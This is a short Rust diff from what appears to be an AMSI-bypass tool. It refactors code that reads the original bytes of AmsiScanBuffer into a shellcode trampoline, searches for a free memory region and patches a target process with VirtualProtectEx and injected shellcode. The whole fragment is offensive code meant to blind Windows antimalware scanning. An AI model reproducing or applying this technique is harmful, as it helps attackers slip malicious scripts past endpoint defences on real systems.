@@ -43,7 +43,10 @@ fn main() {
     println!("[+] Function: AmsiScanBuffer | Address: {:?}", func_address);
 
     println!("[+] Patching the trampoline");
-    patch_trampoline(func_address);
+    unsafe {
+        let original_bytes = *(func_address as *const u64);
+        PATCH_SHELLCODE[18..26].copy_from_slice(&original_bytes.to_ne_bytes());
+    };
 
     println!("[+] Looking for a memory hole");
     let address_role = find_memory_role(func_address as usize, h_process).expect("[!] find_memory_role Failed With Status");
@@ -115,13 +118,6 @@ fn install_trampoline(h_process: HANDLE, address: *mut c_void, function_address:
             &mut old_protect,
         ).expect("[!] VirtualProtectEx (2) Failed With Status");
     };
-}
-
-fn patch_trampoline(function_address: *mut c_void) {
-    unsafe {
-        let original_bytes =  *(function_address as *const u64);
-        PATCH_SHELLCODE[18..26].copy_from_slice(&original_bytes.to_ne_bytes());
-    }
 }
 
 fn write_shellcode(h_process: HANDLE, address: *mut c_void) {
